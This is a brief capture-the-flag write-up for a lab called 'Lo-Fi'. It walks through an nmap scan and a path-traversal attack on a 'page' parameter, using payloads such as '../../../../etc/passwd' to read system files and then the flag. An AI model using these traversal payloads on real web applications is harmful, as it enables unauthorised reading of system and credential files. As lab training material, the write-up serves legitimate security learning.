# Lo-Fi write-up

First we defiind the ip 
```
IP=xx.xx.xxx.xxx
```

I started analyzing the environment using __`nmap`__  to discover open ports 

```
nmap -sV -sC -oN nmap_scan $IP
```
___
-sV = Server version
___
-sC = Default scripts
____
-oN = Saves the output 
___

![image](https://github.com/user-attachments/assets/d8e915e9-250b-4fe4-817e-5fe510265fc2)

We see the port `80 http` it s open 


![image](https://github.com/user-attachments/assets/ee77abff-0f66-4f70-8e99-76f8b7c0806d)

Lets try exploiting somting here ... 



![image](https://github.com/user-attachments/assets/df9b828d-4d57-47cb-9681-6f63c5d21179)

With
```
?page=/../../../../etc/passwd
```
![image](https://github.com/user-attachments/assets/d16fa1dc-9e99-4ad1-9d33-f8593588a656)

Not good ... but not bad eather 
----
Let s try without the root directory first 


```
?page=../../../../etc/passwd
```

![image](https://github.com/user-attachments/assets/9a7fa12b-6a74-4b1a-a9d9-d7398edf184e)

Perferct 👑
Now ... where it s the flag ? After some deep digging ... 2h 🥹 i find it in 
```
?page=../../../../flag.txt
```
![image](https://github.com/user-attachments/assets/974754f1-b5aa-4848-bbbd-584c8925605a)









